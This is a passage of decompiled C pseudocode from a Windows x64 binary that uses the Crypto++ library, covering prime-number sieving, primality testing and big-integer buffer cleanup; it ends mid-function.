__int64 __fastcall sub_14005AF70(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v4; // rbx
  unsigned int v5; // edi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // r9

  v4 = a1;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  v9 = 0i64;
  if ( *(_BYTE *)(v4 + 32) )
    v9 = v5;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v8 + 48i64))(v8, v7, v6, v9);
}

//----- (000000014005AFE0) ----------------------------------------------------
__int64 __fastcall sub_14005AFE0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  _QWORD *v5; // rsi
  __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = (_QWORD *)a1;
  sub_140038C40(a1, a3 * a2);
  result = v5[2];
  v5[3] = v3;
  v5[6] = result;
  v5[4] = v4;
  v5[5] = 0i64;
  return result;
}

//----- (000000014005B030) ----------------------------------------------------
void __fastcall sub_14005B030(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx
  void *v3; // rax
  void *v4; // r8
  bool v5; // zf
  __int64 v6; // rax
  unsigned __int64 v7; // rcx
  char v8; // [rsp+20h] [rbp-69h]
  void *v9; // [rsp+28h] [rbp-61h]
  __int64 v10; // [rsp+30h] [rbp-59h]
  unsigned __int64 v11; // [rsp+40h] [rbp-49h]
  void *Memory; // [rsp+48h] [rbp-41h]
  __int64 v13; // [rsp+50h] [rbp-39h]
  char v14; // [rsp+58h] [rbp-31h]
  __int64 v15; // [rsp+68h] [rbp-21h]
  __int64 v16; // [rsp+70h] [rbp-19h]
  __int64 (__fastcall **v17)(void *); // [rsp+80h] [rbp-9h]
  int v18; // [rsp+98h] [rbp+Fh]
  char Dst; // [rsp+A0h] [rbp+17h]
  __int64 v20; // [rsp+B0h] [rbp+27h]
  __int64 v21; // [rsp+B8h] [rbp+2Fh]

  v13 = -2i64;
  v2 = a1;
  v11 = 0i64;
  Memory = 0i64;
  v9 = 0i64;
  v10 = 0i64;
  v8 = 0;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)a2 + 8i64))(
          a2,
          "InputBuffer",
          &CryptoPP::cls_053 `RTTI Type Descriptor',
          &v8) )
  {
    v16 = 15i64;
    v15 = 0i64;
    v14 = 0;
    sub_140004F20(&v14, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v17);
    v17 = &off_1400A8798;
    v18 = 1;
    v21 = 15i64;
    v20 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v14, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v17 = &off_1400A8798;
    CxxThrowException(&v17, &_TI3_AVcls_001_CryptoPP__);
  }
  v3 = v9;
  v4 = Memory;
  v5 = v8 == 0;
  if ( v8 )
    v3 = Memory;
  v2[5] = v3;
  v6 = v10;
  v7 = v11;
  if ( !v5 )
    v6 = v11;
  v2[6] = v6;
  v2[7] = 0i64;
  memset(v4, 0, v7);
  free(v4);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (000000014005B180) ----------------------------------------------------
__int64 __fastcall sub_14005B180(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v7 + 248i64))(v7, v6, v5, v4);
}

//----- (000000014005B1D0) ----------------------------------------------------
__int64 __fastcall sub_14005B1D0(_QWORD *a1, __int64 a2, __int64 *a3, __int64 a4, char a5)
{
  __int64 v5; // r10
  __int64 *v6; // rdi
  char v7; // ST28_1
  __int64 v8; // ST20_8
  __int64 v9; // r9
  _QWORD *v10; // rbx
  __int64 result; // rax
  __int64 v12; // rdx
  __int64 v13; // [rsp+40h] [rbp+8h]

  v5 = *a1;
  v6 = a3;
  v7 = a5;
  v8 = a4;
  v9 = *a3;
  v10 = a1;
  v13 = 0i64;
  result = (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64 *, __int64, __int64, char))(v5 + 256))(
             a1,
             a2,
             &v13,
             v9,
             v8,
             v7);
  v12 = v13;
  v10[7] += v13;
  *v6 = v12;
  return result;
}

//----- (000000014005B2D0) ----------------------------------------------------
void __fastcall sub_14005B2D0(__int64 *a1)
{
  __int64 v1; // rbx

  v1 = *a1;
  if ( *a1 )
  {
    if ( *(_QWORD *)v1 )
    {
      operator delete(*(void **)v1);
      *(_QWORD *)v1 = 0i64;
      *(_QWORD *)(v1 + 8) = 0i64;
      *(_QWORD *)(v1 + 16) = 0i64;
    }
    operator delete((void *)v1);
  }
}

//----- (000000014005B310) ----------------------------------------------------
void __fastcall sub_14005B310(_QWORD *a1)
{
  _QWORD *v1; // rbx
  void *v2; // rcx

  v1 = a1;
  a1[3] = 0i64;
  v2 = (void *)*a1;
  if ( v2 )
  {
    operator delete(v2);
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
}

//----- (000000014005B3F0) ----------------------------------------------------
__int64 sub_14005B3F0()
{
  char v0; // di
  void *v1; // rbx
  __int64 v2; // rax
  __int64 v3; // rbx
  void *v4; // rdx
  char v6; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v0 = 0;
  v1 = operator new(0x28ui64);
  if ( v1 )
  {
    v2 = sub_14003C0E0((__int64)&v6, 32719);
    v0 = 1;
    v3 = sub_140029020(v2, (__int64)v1);
  }
  else
  {
    v3 = 0i64;
  }
  if ( v0 & 1 )
  {
    v4 = Memory;
    memset(Memory, 0, 8 * v7);
    free(v4);
  }
  return v3;
}

//----- (000000014005B480) ----------------------------------------------------
_QWORD *sub_14005B480()
{
  _QWORD *v0; // rax
  _QWORD *v1; // rbx
  unsigned __int64 v2; // rax
  signed __int64 v3; // rdi
  _WORD *v4; // rcx
  unsigned __int64 v5; // r9
  _WORD *v6; // rax
  unsigned int v7; // esi
  unsigned int v8; // er10
  unsigned int v9; // er8
  bool v10; // zf
  __int64 v11; // rcx
  signed __int64 v12; // rdi
  __int64 v13; // rdx
  signed __int64 v14; // r9
  unsigned __int64 v15; // r9
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // rdx
  _WORD *v18; // rcx
  __int64 v19; // rdx
  signed __int64 v20; // r9
  unsigned __int64 v21; // r9
  unsigned __int64 v22; // rdx
  unsigned __int64 v23; // rdx
  _WORD *v24; // rax
  signed __int64 v25; // rax
  unsigned __int64 v26; // rax
  __int16 v28; // [rsp+58h] [rbp+10h]
  _QWORD *v29; // [rsp+60h] [rbp+18h]

  v0 = operator new(0x18ui64);
  v1 = v0;
  if ( v0 )
  {
    *v0 = 0i64;
    v0[1] = 0i64;
    v0[2] = 0i64;
  }
  else
  {
    v1 = 0i64;
  }
  v29 = v1;
  if ( (v1[2] - *v1) >> 1 < 0xDB7ui64 )
    sub_14005EE60((__int64)v1, 0xDB7ui64);
  v28 = 2;
  v2 = v1[1];
  if ( (unsigned __int64)&v28 >= v2 || *v1 > (unsigned __int64)&v28 )
  {
    if ( v2 == v1[2] )
      sub_14005EFF0(v1, 1ui64);
    v6 = (_WORD *)v1[1];
    if ( v6 )
      *v6 = 2;
    v5 = v1[1] + 2i64;
  }
  else
  {
    v3 = ((signed __int64)&v28 - *v1) >> 1;
    if ( v2 == v1[2] )
      sub_14005EFF0(v1, 1ui64);
    v4 = (_WORD *)v1[1];
    if ( v4 )
      *v4 = *(_WORD *)(*v1 + 2 * v3);
    v5 = v1[1] + 2i64;
  }
  v1[1] = v5;
  v7 = 3;
  v8 = 1;
  while ( 1 )
  {
    v9 = 1;
    v10 = v8 == 1;
    if ( v8 > 1 )
    {
      do
      {
        if ( !(v7 % *(unsigned __int16 *)(*v1 + 2i64 * v9)) )
          break;
        ++v9;
      }
      while ( v9 < v8 );
      v10 = v9 == v8;
    }
    if ( !v10 )
      goto LABEL_50;
    v28 = v7;
    if ( (unsigned __int64)&v28 >= v5 || (v11 = *v1, *v1 > (unsigned __int64)&v28) )
    {
      v19 = v1[2];
      if ( v5 == v19 && (unsigned __int64)((signed __int64)(v19 - v5) >> 1) < 1 )
      {
        v20 = (signed __int64)(v5 - *v1) >> 1;
        if ( (unsigned __int64)(0x7FFFFFFFFFFFFFFFi64 - v20) < 1 )
          goto LABEL_53;
        v21 = v20 + 1;
        v22 = (v19 - *v1) >> 1;
        if ( 0x7FFFFFFFFFFFFFFFi64 - (v22 >> 1) >= v22 )
          v23 = (v22 >> 1) + v22;
        else
          v23 = 0i64;
        if ( v23 < v21 )
          v23 = v21;
        sub_14005EE60((__int64)v1, v23);
      }
      v24 = (_WORD *)v1[1];
      if ( v24 )
        *v24 = v7;
      goto LABEL_48;
    }
    v12 = ((signed __int64)&v28 - v11) >> 1;
    v13 = v1[2];
    if ( v5 == v13 && (unsigned __int64)((signed __int64)(v13 - v5) >> 1) < 1 )
      break;
LABEL_35:
    v18 = (_WORD *)v1[1];
    if ( v18 )
      *v18 = *(_WORD *)(*v1 + 2 * v12);
LABEL_48:
    v25 = v1[1] + 2i64;
    v1[1] = v25;
    v5 = v25;
    v26 = (v25 - *v1) >> 1;
    v8 = 54;
    if ( v26 < 0x36 )
      v8 = v26;
LABEL_50:
    v7 += 2;
    if ( v7 > 0x7FCF )
      return v1;
  }
  v14 = (signed __int64)(v5 - v11) >> 1;
  if ( (unsigned __int64)(0x7FFFFFFFFFFFFFFFi64 - v14) >= 1 )
  {
    v15 = v14 + 1;
    v16 = (v13 - v11) >> 1;
    if ( 0x7FFFFFFFFFFFFFFFi64 - (v16 >> 1) >= v16 )
      v17 = (v16 >> 1) + v16;
    else
      v17 = 0i64;
    if ( v17 < v15 )
      v17 = v15;
    sub_14005EE60((__int64)v1, v17);
    goto LABEL_35;
  }
  std::_Xlength_error("vector<T> too long");
  __debugbreak();
LABEL_53:
  std::_Xlength_error("vector<T> too long");
  return v1;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014005B730) ----------------------------------------------------
__int64 __fastcall sub_14005B730(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rdi
  __int64 v7; // rsi
  __int64 v8; // rax
  __int64 v9; // rax
  void *v10; // rdx
  void *v11; // rdx
  void *v12; // rdx
  void *v13; // rdx
  char v15; // [rsp+30h] [rbp-A8h]
  __int64 v16; // [rsp+40h] [rbp-98h]
  void *Memory; // [rsp+48h] [rbp-90h]
  char v18; // [rsp+58h] [rbp-80h]
  __int64 v19; // [rsp+68h] [rbp-70h]
  void *v20; // [rsp+70h] [rbp-68h]
  char v21; // [rsp+80h] [rbp-58h]
  __int64 v22; // [rsp+90h] [rbp-48h]
  void *v23; // [rsp+98h] [rbp-40h]
  __int64 v24; // [rsp+A8h] [rbp-30h]
  __int64 v25; // [rsp+B8h] [rbp-20h]
  void *v26; // [rsp+C0h] [rbp-18h]

  v6 = a3;
  v7 = a1;
  sub_140024710((__int64)&v24, a4, a2);
  v8 = sub_1400246E0((__int64)&v18, a6);
  sub_1400247D0((__int64)&v21, v8);
  v9 = sub_1400246E0((__int64)&v15, v6);
  sub_140024740(v7, v9);
  v10 = Memory;
  memset(Memory, 0, 8 * v16);
  free(v10);
  v11 = v23;
  memset(v23, 0, 8 * v22);
  free(v11);
  v12 = v20;
  memset(v20, 0, 8 * v19);
  free(v12);
  v13 = v26;
  memset(v26, 0, 8 * v25);
  free(v13);
  return v7;
}

//----- (000000014005B860) ----------------------------------------------------
__int64 __fastcall sub_14005B860(signed int a1)
{
  double v2; // xmm6_8
  double v3; // xmm0_8
  double v4; // xmm7_8

  if ( (unsigned int)a1 < 5 )
    return 0i64;
  v2 = (double)a1;
  v3 = log((double)a1);
  v4 = pow(v3, 0.6666666666666666);
  return (unsigned int)(signed int)(v4 * (pow(v2, 0.3333333333333333) * 2.4) - 5.0);
}

//----- (000000014005BBD0) ----------------------------------------------------
__int64 __fastcall sub_14005BBD0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int8 (__fastcall ***a5)(_QWORD, int *))
{
  __int64 v5; // rbx
  __int64 v6; // rdi
  int v7; // esi
  __int64 v8; // rax
  unsigned __int8 v9; // bl
  __int64 *v10; // rax
  bool v11; // bl
  void *v12; // rdx
  unsigned __int64 v13; // r9
  unsigned int v14; // er8
  __int64 v15; // rcx
  unsigned __int16 *v16; // rbx
  signed __int64 v17; // rdi
  unsigned __int16 *v18; // rdx
  unsigned __int64 v19; // rax
  int v20; // esi
  __int64 v21; // rax
  void *v22; // rdx
  void *v23; // rdx
  void *v24; // rdx
  void *v25; // rdx
  __int64 v26; // rsi
  void *v27; // rdx
  void *v28; // rdx
  void *v29; // rdx
  void *v30; // rdx
  void *v31; // rdx
  void *v32; // rdx
  __int64 v33; // rax
  __int64 v34; // rax
  void *v35; // rdx
  void *v36; // rdx
  char v37; // bl
  void *v38; // rdx
  void *v39; // rdx
  char v41; // [rsp+30h] [rbp-D0h]
  unsigned __int16 *v42; // [rsp+38h] [rbp-C8h]
  unsigned __int64 i; // [rsp+40h] [rbp-C0h]
  char v44; // [rsp+48h] [rbp-B8h]
  __int64 v45; // [rsp+58h] [rbp-A8h]
  void *v46; // [rsp+60h] [rbp-A0h]
  char v47; // [rsp+70h] [rbp-90h]
  __int64 v48; // [rsp+80h] [rbp-80h]
  void *Memory; // [rsp+88h] [rbp-78h]
  char v50; // [rsp+98h] [rbp-68h]
  __int64 v51; // [rsp+A8h] [rbp-58h]
  void *v52; // [rsp+B0h] [rbp-50h]
  unsigned __int16 *v53; // [rsp+C0h] [rbp-40h]
  int v54; // [rsp+C8h] [rbp-38h]
  __int64 v55; // [rsp+D8h] [rbp-28h]
  void *v56; // [rsp+E0h] [rbp-20h]
  char v57; // [rsp+F0h] [rbp-10h]
  __int64 v58; // [rsp+100h] [rbp+0h]
  void *v59; // [rsp+108h] [rbp+8h]
  char v60; // [rsp+118h] [rbp+18h]
  __int64 v61; // [rsp+128h] [rbp+28h]
  void *v62; // [rsp+130h] [rbp+30h]
  __int64 v63; // [rsp+140h] [rbp+40h]
  char v64; // [rsp+150h] [rbp+50h]
  __int64 v65; // [rsp+230h] [rbp+130h]
  __int64 v66; // [rsp+238h] [rbp+138h]
  __int64 v67; // [rsp+240h] [rbp+140h]
  __int64 v68; // [rsp+248h] [rbp+148h]

  v68 = a4;
  v67 = a3;
  v66 = a2;
  v65 = a1;
  v63 = -2i64;
  v5 = a2;
  v6 = a1;
  v7 = 0;
  LODWORD(v42) = 0;
  sub_14005C1D0((__int64)&v54);
  v8 = sub_140049E30();
  if ( (unsigned int)sub_140045A60((__int64)&v54, v8) )
  {
    if ( (signed int)sub_140045A60(v6, (__int64)&v54) <= 0
      && (signed int)sub_140045A60((__int64)&v54, v5) <= 0
      && (unsigned __int8)sub_14005CFC0((unsigned __int64)&v54)
      && (!a5 || (**a5)(a5, &v54)) )
    {
      sub_14003C670(v6, (__int64)&v54);
      v9 = 1;
      goto LABEL_50;
    }
LABEL_40:
    v9 = 0;
    goto LABEL_50;
  }
  v10 = (__int64 *)sub_14005E5A0(&v41);
  v42 = (unsigned __int16 *)*v10;
  i = (v10[1] - (signed __int64)v42) >> 1;
  v53 = &v42[(unsigned int)(i - 1)];
  sub_14003C0E0((__int64)&v47, *v53);
  v11 = (signed int)sub_140045A60(v6, (__int64)&v47) <= 0;
  v12 = Memory;
  memset(Memory, 0, 8 * v48);
  free(v12);
  if ( v11 )
  {
    sub_14003CF00(v65);
    if ( *(_DWORD *)(v65 + 32) == 1 || sub_14003CDA0(v65) )
    {
      v15 = (__int64)v42;
      v16 = v42;
      v14 = i;
    }
    else
    {
      v13 = (signed int)sub_140045B70(v65);
      v14 = i;
      v15 = (__int64)v42;
      v16 = v42;
      v17 = 2i64 * (unsigned int)i >> 1;
      if ( v17 > 0 )
      {
        do
        {
          v18 = &v16[v17 / 2];
          if ( v13 < *v18 )
          {
            v17 /= 2i64;
          }
          else
          {
            v16 = v18 + 1;
            v17 += -1 - v17 / 2;
          }
        }
        while ( v17 > 0 );
        v15 = (__int64)v42;
      }
    }
    v19 = v15 + 2i64 * v14;
    for ( i = v15 + 2i64 * v14; ; v19 = i )
    {
      if ( (unsigned __int64)v16 >= v19 )
        goto LABEL_53;
      sub_14003C0E0((__int64)&v44, *v16);
      v20 = v7 | 1;
      LODWORD(v42) = v20;
      v21 = sub_1400247D0((__int64)&v50, (__int64)&v44);
      v7 = v20 | 2;
      LODWORD(v42) = v7;
      if ( (unsigned int)sub_140045A60(v21, v67)
        || a5 && (sub_14003C0E0((__int64)&v47, *v16), v7 |= 4u, LODWORD(v42) = v7, !(**a5)(a5, (int *)&v47)) )
      {
        v41 = 1;
      }
      else
      {
LABEL_53:
        v41 = 0;
      }
      if ( v7 & 4 )
      {
        v7 &= 0xFFFFFFFB;
        LODWORD(v42) = v7;
        v22 = Memory;
        memset(Memory, 0, 8 * v48);
        free(v22);
      }
      if ( v7 & 2 )
      {
        v7 &= 0xFFFFFFFD;
        LODWORD(v42) = v7;
        v23 = v52;
        memset(v52, 0, 8 * v51);
        free(v23);
      }
      if ( v7 & 1 )
      {
        v7 &= 0xFFFFFFFE;
        v24 = v46;
        memset(v46, 0, 8 * v45);
        free(v24);
      }
      if ( !v41 )
        break;
      ++v16;
    }
    if ( (unsigned __int64)v16 < i )
    {
      sub_14003C0E0((__int64)&v44, *v16);
      sub_14003C670(v65, (__int64)&v44);
      v25 = v46;
      memset(v46, 0, 8 * v45);
      free(v25);
      v9 = (signed int)sub_140045A60(v65, v66) <= 0;
      goto LABEL_50;
    }
    sub_14003C0E0((__int64)&v44, *v53 + 1);
    v26 = v65;
    sub_14003C670(v65, (__int64)&v44);
    v27 = v46;
    memset(v46, 0, 8 * v45);
    free(v27);
  }
  else
  {
    v26 = v65;
  }
  if ( sub_140048010(v68, 0i64) == 1 )
  {
    sub_14003C0E0((__int64)&v50, 1);
    sub_14003C0E0((__int64)&v47, 2);
    sub_14003C0E0((__int64)&v44, 1);
    sub_140024640(v68, (__int64)&v60, 1ui64);
    sub_14005B730((__int64)&v57, v67, v68, (__int64)&v44, (__int64)&v47, (__int64)&v50);
    v9 = sub_14005BBD0(v26);
    v28 = v59;
    memset(v59, 0, 8 * v58);
    free(v28);
    v29 = v62;
    memset(v62, 0, 8 * v61);
    free(v29);
    v30 = v46;
    memset(v46, 0, 8 * v45);
    free(v30);
    v31 = Memory;
    memset(Memory, 0, 8 * v48);
    free(v31);
    v32 = v52;
    memset(v52, 0, 8 * v51);
    free(v32);
    goto LABEL_50;
  }
  v33 = sub_140024710((__int64)&v57, v67, v26);
  v34 = sub_1400247D0((__int64)&v60, v33);
  sub_14003D540(v26, v34);
  v35 = v62;
  memset(v62, 0, 8 * v61);
  free(v35);
  v36 = v59;
  memset(v59, 0, 8 * v58);
  free(v36);
  if ( (signed int)sub_140045A60(v26, v66) > 0 )
    goto LABEL_40;
  sub_14005B220((unsigned __int64)&v64);
  while ( sub_14005E0E0((__int64)&v64, v26) )
  {
    if ( !a5 || (**a5)(a5, (int *)v26) )
    {
      sub_14003C0E0((__int64)&v50, 2);
      v37 = sub_14005D790(v26, (__int64)&v50);
      v38 = v52;
      memset(v52, 0, 8 * v51);
      free(v38);
      if ( v37 )
      {
        if ( (unsigned __int8)sub_14005CFC0(v26) )
        {
          v9 = 1;
          goto LABEL_49;
        }
      }
    }
  }
  v9 = 0;
LABEL_49:
  sub_14005B350(&v64);
LABEL_50:
  v39 = v56;
  memset(v56, 0, 8 * v55);
  free(v39);
  return v9;
}
// 14005B220: using guessed type __int64 __fastcall sub_14005B220(_DWORD);
// 14005B350: using guessed type __int64 __fastcall sub_14005B350(_QWORD);
// 14005E5A0: using guessed type __int64 __fastcall sub_14005E5A0(_QWORD);

//----- (000000014005C1D0) ----------------------------------------------------
__int64 __fastcall sub_14005C1D0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  sub_1400471E0(a1);
  return v1;
}
// 1400471E0: using guessed type __int64 __cdecl sub_1400471E0(_QWORD);

//----- (000000014005C1F0) ----------------------------------------------------
void __usercall sub_14005C1F0(int a1@<edx>, __int64 a2@<rcx>, __int64 a3@<r8>, unsigned int a4@<r9d>)
{
  __int64 v4; // rsi
  __int64 v5; // r13
  int v6; // er12
  __int64 v7; // r14
  int v8; // ebx
  __int64 v9; // rax
  void *v10; // rdx
  void *v11; // rdx
  char v12; // r15
  int v13; // edi
  void *v14; // rdx
  void *v15; // rdx
  int v16; // eax
  __int64 v17; // rdi
  int *v18; // rsi
  void *v19; // rdx
  void *v20; // rdx
  void *v21; // rdx
  __int64 v22; // rax
  __int64 v23; // rax
  void *v24; // rdx
  void *v25; // rdx
  void *v26; // rdx
  char v27; // si
  void *v28; // rdx
  char v29; // si
  void *v30; // rdx
  void *v31; // rdx
  void *v32; // rdx
  void *v33; // r8
  void *v34; // rdx
  void *v35; // rdx
  int v36; // ebx
  __int64 v37; // rax
  __int64 v38; // rax
  int v39; // ebx
  __int64 v40; // rax
  bool v41; // r15
  void *v42; // rdx
  void *v43; // rdx
  void *v44; // rdx
  void *v45; // rdx
  void *v46; // rdx
  void *v47; // rdx
  void *v48; // rdx
  __int64 v49; // rcx
  __int64 v50; // rax
  void *v51; // rdx
  void *v52; // rdx
  __int64 v53; // rax
  void *v54; // rdx
  __int64 v55; // rdi
  __int64 v56; // rax
  __int64 v57; // rax
  bool v58; // si
  void *v59; // rdx
  void *v60; // rdx
  __int64 v61; // rsi
  __int64 v62; // rdi
  __int64 v63; // rax
  void *v64; // rdx
  void *v65; // rdx
  void *v66; // rdx
  __int64 v67; // rax
  __int64 v68; // rax
  void *v69; // rax
  void *v70; // rdx
  void *v71; // rdx
  void *v72; // rdx
  void *v73; // rdx
  void *v74; // rdx
  void *v75; // rdx
  __int64 v76; // rsi
  __int64 v77; // rdi
  __int64 v78; // rax
  void *v79; // rdx
  void *v80; // rdx
  void *v81; // rdx
  __int64 v82; // rax
  __int64 v83; // rax
  void *v84; // rdx
  void *v85; // rdx
  void *v86; // rdx
  __int64 v87; // rax
  __int64 v88; // rax
  __int64 v89; // rax
  void *v90; // rdx
  void *v91; // rdx
  void *v92; // rdx
  void *v93; // rdx
  void *v94; // rdx
  bool v95; // si
  void *v96; // rdx
  void *v97; // rdx
  void *v98; // rdx
  void *v99; // rdx
  int v100; // [rsp+40h] [rbp-98h]
  __int64 v101; // [rsp+50h] [rbp-88h]
  void *v102; // [rsp+58h] [rbp-80h]
  int v103; // [rsp+68h] [rbp-70h]
  __int64 v104; // [rsp+78h] [rbp-60h]
  void *v105; // [rsp+80h] [rbp-58h]
  int v106; // [rsp+90h] [rbp-48h]
  __int64 v107; // [rsp+A0h] [rbp-38h]
  void *v108; // [rsp+A8h] [rbp-30h]
  char v109; // [rsp+B8h] [rbp-20h]
  __int64 v110; // [rsp+C8h] [rbp-10h]
  void *v111; // [rsp+D0h] [rbp-8h]
  char v112; // [rsp+E0h] [rbp+8h]
  __int64 v113; // [rsp+F0h] [rbp+18h]
  void *v114; // [rsp+F8h] [rbp+20h]
  int v115; // [rsp+108h] [rbp+30h]
  __int64 v116; // [rsp+118h] [rbp+40h]
  void *v117; // [rsp+120h] [rbp+48h]
  char v118; // [rsp+130h] [rbp+58h]
  __int64 v119; // [rsp+140h] [rbp+68h]
  void *v120; // [rsp+148h] [rbp+70h]
  int v121; // [rsp+158h] [rbp+80h]
  __int64 v122; // [rsp+168h] [rbp+90h]
  void *v123; // [rsp+170h] [rbp+98h]
  char v124; // [rsp+180h] [rbp+A8h]
  __int64 v125; // [rsp+190h] [rbp+B8h]
  void *v126; // [rsp+198h] [rbp+C0h]
  char v127; // [rsp+1A8h] [rbp+D0h]
  __int64 v128; // [rsp+1B8h] [rbp+E0h]
  void *v129; // [rsp+1C0h] [rbp+E8h]
  char v130; // [rsp+1D0h] [rbp+F8h]
  __int64 v131; // [rsp+1E0h] [rbp+108h]
  void *Memory; // [rsp+1E8h] [rbp+110h]
  char v133; // [rsp+1F8h] [rbp+120h]
  __int64 v134; // [rsp+208h] [rbp+130h]
  void *v135; // [rsp+210h] [rbp+138h]
  char v136; // [rsp+220h] [rbp+148h]
  __int64 v137; // [rsp+230h] [rbp+158h]
  void *v138; // [rsp+238h] [rbp+160h]
  char v139; // [rsp+248h] [rbp+170h]
  __int64 v140; // [rsp+258h] [rbp+180h]
  void *v141; // [rsp+260h] [rbp+188h]
  char v142; // [rsp+270h] [rbp+198h]
  __int64 v143; // [rsp+280h] [rbp+1A8h]
  void *v144; // [rsp+288h] [rbp+1B0h]
  char v145; // [rsp+298h] [rbp+1C0h]
  __int64 v146; // [rsp+2A8h] [rbp+1D0h]
  void *v147; // [rsp+2B0h] [rbp+1D8h]
  int v148; // [rsp+2C0h] [rbp+1E8h]
  __int64 v149; // [rsp+2C8h] [rbp+1F0h]
  void *v150; // [rsp+2D0h] [rbp+1F8h]
  __int128 v151; // [rsp+2D8h] [rbp+200h]
  __int64 v152; // [rsp+2E8h] [rbp+210h]
  __int64 v153; // [rsp+2F8h] [rbp+220h]
  char v154; // [rsp+300h] [rbp+228h]
  __int64 v155; // [rsp+310h] [rbp+238h]
  void *v156; // [rsp+318h] [rbp+240h]
  char v157; // [rsp+328h] [rbp+250h]
  __int64 v158; // [rsp+338h] [rbp+260h]
  void *v159; // [rsp+340h] [rbp+268h]
  int vars0; // [rsp+3A0h] [rbp+2C8h]
  void *retaddr; // [rsp+3A8h] [rbp+2D0h]

  v153 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a1;
  v7 = a2;
  v8 = 0;
  vars0 = 0;
  if ( (_DWORD)retaddr + 1 == a4 )
  {
    sub_14004A6C0(&v127, a4 - 1);
    sub_14003C0E0((__int64)&v109, 1);
    v9 = sub_14004A6C0(&v130, (unsigned int)v4);
    sub_140024710((__int64)&v103, v9, (__int64)&v109);
    v10 = Memory;
    memset(Memory, 0, 8 * v131);
    free(v10);
    v11 = v111;
    memset(v111, 0, 8 * v110);
    free(v11);
    v12 = 0;
    LOBYTE(retaddr) = 0;
    v13 = v6 + 4 * v6 + 6;
    vars0 = 0;
    do
    {
      sub_14003C0E0((__int64)&v100, 12);
      sub_14003C0E0((__int64)&v106, v13);
      sub_14004AB20(v7, v5, (__int64)&v127, (__int64)&v103, 0, (__int64)&v106, (__int64)&v100);
      v14 = v108;
      memset(v108, 0, 8 * v107);
      free(v14);
      v15 = v102;
      memset(v102, 0, 8 * v101);
      free(v15);
      sub_14003C0E0((__int64)&v106, 12);
      v16 = sub_140045340((__int64)&v103);
      sub_14003C0E0((__int64)&v100, 12 * v16);
      v17 = sub_140024740((__int64)&v115, v7);
      v18 = &v103;
      if ( (signed int)sub_140045A60((__int64)&v103, v17) >= 0 )
        v18 = (int *)v17;
      sub_14003C000((__int64)&v139, v7);
      sub_14003C000((__int64)&v142, (__int64)v18);
      sub_14003C000((__int64)&v145, (__int64)&v106);
      v148 = v6;
      v149 = 0i64;
      v150 = 0i64;
      _mm_store_si128((__m128i *)&v151, (__m128i)0i64);
      sub_14005EA10(&v150, 0i64, &vars0);
      v152 = 0i64;
      sub_14005B8E0(&v139);
      v19 = v117;
      memset(v117, 0, 8 * v116);
      free(v19);
      v20 = v102;
      memset(v102, 0, 8 * v101);
      free(v20);
      v21 = v108;
      memset(v108, 0, 8 * v107);
      free(v21);
      if ( sub_14005E0E0((__int64)&v139, v7) )
      {
        do
        {
          sub_14003C0E0((__int64)&v103, v6);
          v22 = sub_140024710((__int64)&v118, v7, (__int64)&v103);
          v23 = sub_14003CA00(v22, (__int64)&v112, 1ui64);
          sub_14003C670(v7 + 40, v23);
          v24 = v114;
          memset(v114, 0, 8 * v113);
          free(v24);
          v25 = v120;
          memset(v120, 0, 8 * v119);
          free(v25);
          v26 = v102;
          memset(v102, 0, 8 * v104);
          free(v26);
          sub_14003C0E0((__int64)&v103, 2);
          v27 = sub_14005D790(v7 + 40, (__int64)&v103);
          v28 = v102;
          memset(v102, 0, 8 * v104);
          free(v28);
          if ( v27 )
          {
            sub_14003C0E0((__int64)&v103, 2);
            v29 = sub_14005D790(v7, (__int64)&v103);
            v30 = v102;
            memset(v102, 0, 8 * v104);
            free(v30);
            if ( v29 )
            {
              if ( (unsigned __int8)sub_14005CFC0((signed int)v7 + 40) && (unsigned __int8)sub_14005CFC0(v7) )
              {
                v12 = 1;
                LOBYTE(retaddr) = 1;
                goto LABEL_14;
              }
            }
          }
        }
        while ( sub_14005E0E0((__int64)&v139, v7) );
        v12 = (char)retaddr;
      }
LABEL_14:
      v152 = 0i64;
      if ( v150 )
      {
        operator delete(v150);
        v150 = 0i64;
        _mm_store_si128((__m128i *)&v151, (__m128i)0i64);
      }
      v31 = v147;
      memset(v147, 0, 8 * v146);
      free(v31);
      v32 = v144;
      memset(v144, 0, 8 * v143);
      free(v32);
      v33 = v141;
      memset(v141, 0, 8 * v140);
      free(v33);
      v13 = 4 * v6 + 6 + v6;
    }
    while ( !v12 );
    if ( v6 == 1 )
    {
